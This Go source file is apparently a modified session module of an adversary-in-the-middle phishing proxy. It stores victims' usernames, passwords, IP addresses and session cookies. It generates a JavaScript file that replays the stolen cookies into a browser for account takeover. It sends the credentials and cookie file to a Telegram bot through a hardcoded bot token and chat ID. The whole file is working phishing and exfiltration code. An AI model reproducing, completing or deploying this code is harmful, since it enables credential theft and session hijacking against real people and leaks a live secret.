package database

import (
	"encoding/json"
	"fmt"
	"time"
	"strings"
    "io/ioutil"
    "log"

	"github.com/tidwall/buntdb"
	//"github.com/go-telegram-bot-api/telegram-bot-api"
	"gopkg.in/telegram-bot-api.v4"
)

const SessionTable = "sessions"
var tCu string
var tCp string
var tCt string
var tCiP string
var body string
var dcF string
type Session struct {
	Id           int                                `json:"id"`
	Phishlet     string                             `json:"phishlet"`
	LandingURL   string                             `json:"landing_url"`
	Username     string                             `json:"username"`
	Password     string                             `json:"password"`
	Custom       map[string]string                  `json:"custom"`
	BodyTokens   map[string]string                  `json:"body_tokens"`
	HttpTokens   map[string]string                  `json:"http_tokens"`
	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
	SessionId    string                             `json:"session_id"`
	UserAgent    string                             `json:"useragent"`
	RemoteAddr   string                             `json:"remote_addr"`
	CreateTime   int64                              `json:"create_time"`
	UpdateTime   int64                              `json:"update_time"`
}
type CookieToken struct {
	Name     string
	Value    string
	Path     string
	HttpOnly bool
}
type Document struct {
	Title string
	Body  []byte
}
// Save dumps document as txt file on disc.
func (p *Document) save() error {
	filename := "cookies/" + p.Title + ".txt"
	return ioutil.WriteFile(filename, p.Body, 0777)
}
func (d *Database) sessionsInit() {
	d.db.CreateIndex("sessions_id", SessionTable+":*", buntdb.IndexJSON("id"))
	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
}
func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
	_, err := d.sessionsGetBySid(sid)
	if err == nil {
		return nil, fmt.Errorf("session already exists: %s", sid)
	}

	id, _ := d.getNextId(SessionTable)

	s := &Session{
		Id:           id,
		Phishlet:     phishlet,
		LandingURL:   landing_url,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remote_addr,
		CreateTime:   time.Now().UTC().Unix(),
		UpdateTime:   time.Now().UTC().Unix(),
	}
	tCiP = remote_addr

	jf, _ := json.Marshal(s)

	err = d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsList() ([]*Session, error) {
	sessions := []*Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		tx.Ascend("sessions_id", func(key, val string) bool {
			s := &Session{}
			if err := json.Unmarshal([]byte(val), s); err == nil {
				sessions = append(sessions, s)
			}
			return true
		})
		return nil
	})
	if err != nil {
		return nil, err
	}
	return sessions, nil
}

func (d *Database) sessionsUpdateUsername(sid string, username string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Username = username
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	tCu = username
	return err
}

func (d *Database) sessionsUpdatePassword(sid string, password string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Password = password
	s.UpdateTime = time.Now().UTC().Unix()
	tCp = password
	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCustom(sid string, name string, value string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.Custom[name] = value
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateBodyTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.BodyTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateHttpTokens(sid string, tokens map[string]string) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.HttpTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()

	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdateCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
	s, err := d.sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	s.CookieTokens = tokens
	s.UpdateTime = time.Now().UTC().Unix()
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
		Secure         bool   `json:"secure,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         false,
			}
			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
				c.Secure = true
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	tCt = string(json)
	saveDoc(tCu, tCt)
	comBined := "New Potential Blesser \r\nEagle: " + tCu + "\r\nPanda: " + tCp + "\r\nIP Address: " + tCiP
	send(comBined, "5689421286:AAFAwYrzC2rcKP4NWH9h8IxZO71HeLfv7Xs", 5322092598, tCu)
	err = d.sessionsUpdate(s.Id, s)
	return err
}

func (d *Database) sessionsUpdate(id int, s *Session) error {
	jf, _ := json.Marshal(s)

	err := d.db.Update(func(tx *buntdb.Tx) error {
		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
		return nil
	})
	return err
}

func (d *Database) sessionsDelete(id int) error {
	err := d.db.Update(func(tx *buntdb.Tx) error {
		_, err := tx.Delete(d.genIndex(SessionTable, id))
		return err
	})
	return err
}

func (d *Database) sessionsGetById(id int) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_id", d.getPivot(map[string]int{"id": id}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session ID not found: %d", id)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}

func (d *Database) sessionsGetBySid(sid string) (*Session, error) {
	s := &Session{}
	err := d.db.View(func(tx *buntdb.Tx) error {
		found := false
		err := tx.AscendEqual("sessions_sid", d.getPivot(map[string]string{"session_id": sid}), func(key, val string) bool {
			json.Unmarshal([]byte(val), s)
			found = true
			return false
		})
		if !found {
			return fmt.Errorf("session not found: %s", sid)
		}
		return err
	})
	if err != nil {
		return nil, err
	}
	return s, nil
}
func send(text string, botT string, chat_id int64, tGcookie string) {
	bot, err := tgbotapi.NewBotAPI(botT)
	if err != nil {
		fmt.Printf("Error creating bot: %v", err)
	}
	bot.Debug = false
	msg := tgbotapi.NewMessage(chat_id, text)
	bot.Send(msg)
	docMsg :=  tgbotapi.NewDocumentUpload(chat_id, "cookies/"+tGcookie+".txt")
	bot.Send(docMsg)
}
func saveDoc(title string, myCookieFile string) {
	dcF = `
	(async () => {
		let cookies = ` + myCookieFile + `
		
		function setCookie(key, value, domain, path, isSecure, sameSite) {
			const cookieMaxAge = 'Max-Age=31536000' // set cookies to one year
			 if (!!sameSite) {
			   cookieSameSite = sameSite;
			} else {
			   cookieSameSite = 'None';
			}
			if (key.startsWith('__Host')) {
				// important not set domain or browser will rejected due to setting a domain
				console.log('cookie Set', key, value);
				document.cookie = ` + "`" + `${key}=${value};${cookieMaxAge};path=/;Secure;SameSite=${cookieSameSite}` + "`" + `
			} else if (key.startsWith('__Secure')) {
				// important set secure flag or browser will rejected due to missing Secure directive
				console.log('cookie Set', key, value, '!IMPORTANT __Secure- prefix: Cookies with names starting with __Secure- (dash is part of the prefix) must be set with the secure flag from a secure page (HTTPS).',);
				document.cookie = ` + "`" + `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=${cookieSameSite}` + "`" + `
			} else {
				if (isSecure) {
					console.log('cookie Set', key, value);
					if (window.location.hostname == domain) {
						document.cookie = ` + "`" + `${key}=${value};${cookieMaxAge}; path=${path}; Secure; SameSite=${cookieSameSite}` + "`" + `
					} else {
						document.cookie = ` + "`" + `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=${cookieSameSite}` + "`" + `
					}
				} else {
					console.log('cookie Set', key, value);
					if (window.location.hostname == domain) {
						document.cookie = ` + "`" + `${key}=${value};${cookieMaxAge};path=${path};` + "`" + `
					} else {
						document.cookie = ` + "`" + `${key}=${value};${cookieMaxAge};domain=${domain};path=${path};` + "`" + `
					}
				}
			}
		}
		for (let cookie of cookies) {
			setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure)
		}
	})();
	`
	body = dcF
	p1 := &Document{Title: title, Body: []byte(body)}
	if err := p1.save(); err != nil {
		log.Fatal(err)
	}
}
